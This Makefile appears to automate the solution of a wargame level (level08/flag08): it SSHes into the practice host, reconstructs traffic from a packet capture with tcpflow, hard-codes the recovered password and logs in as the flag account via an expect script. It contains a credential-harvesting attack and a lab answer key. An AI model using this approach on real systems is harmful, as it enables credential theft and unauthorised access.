all: attack-this

include ../Makefile.inc
user=level08
flag=flag08

attack-this:
	ssh $(user)@$(ip) 'tcpflow -C -r /home/flag08/capture.pcap' && \
	printf 'backd00Rmate' > ./pwd.txt && \
	expect ../expect.xp $(flag) $(ip) ./pwd.txt && rm ./pwd.txt
